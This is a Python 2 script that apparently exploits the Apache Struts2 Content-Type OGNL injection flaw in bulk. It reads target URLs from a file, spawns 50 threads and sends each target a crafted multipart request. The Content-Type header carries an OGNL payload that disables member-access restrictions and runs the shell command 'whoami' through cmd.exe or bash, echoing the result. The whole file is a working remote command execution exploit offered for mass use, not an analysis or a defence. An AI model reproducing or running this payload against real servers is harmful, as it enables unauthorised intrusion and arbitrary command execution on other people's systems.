#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys,Queue,threading
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

url_queue = Queue.Queue(maxsize = 10)
def poc():
    while not url_queue.empty():
        url = url_queue.get()
        #print "测试URl " + str(url)
        register_openers()
        datagen, header = multipart_encode({"image1": "ipconfig"})
        header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Content-Type"]='''%{(#nike='multipart/form-data').
        (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
        (#_memberAccess?(#_memberAccess=#dm):
        ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
        (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
        (#context.setMemberAccess(#dm)))).(#cmd='whoami').
        (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
        (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
        (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
        (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().
        getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
        (#ros.flush())}'''
        try:
            print url
            request = urllib2.Request(url,datagen,headers=header)
            response = urllib2.urlopen(request)
            html = response.read()
            # if "html" in response.read() or len(html) > 40:
            #     pass
            # else:
            #     print "【%s】存在漏洞，whoami回显信息【%s】" % (url,html)
            print html
        except:
            #print "访问失败"
            pass

try:
    url_file = open('url.txt')
    url_str = url_file.read()
    url_list = url_str.split("\n")
    print len(url_list)
    url_queue = Queue.Queue(maxsize = len(url_list))
    for info in url_list:
        url_queue.put(info)
    # 多线程验证
    for t in range(0,50):
        t = threading.Thread(target=poc)
        t.start()
except:
    print "没有"